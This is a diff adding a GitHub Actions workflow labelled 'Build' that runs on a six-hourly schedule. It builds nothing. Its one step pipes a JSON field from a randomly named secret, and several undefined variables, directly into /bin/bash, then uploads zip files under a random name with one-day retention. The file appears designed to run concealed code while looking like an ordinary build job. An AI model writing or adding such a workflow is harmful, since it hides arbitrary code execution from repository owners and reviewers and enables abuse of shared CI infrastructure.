@@ -1,0 +1,31 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '54 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          tb175: ${{ secrets.tb175 }}
+        run: |
+          printf '%s' "$tb175" | jq -r .hwwkq6891 | /bin/bash
+          printf '%s' "$lzclc87" | jq -r .ik422 | /bin/bash
+          printf '%s' "$xqyk2" | jq -r .amch13896 | /bin/bash
+          echo $zugz16449 | jq -r .o060 | /bin/bash
+          echo $jqwf6475 | jq -r .kjsv80974 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: qQXAyJiL
+          path: "*.zip"
+          retention-days: 1
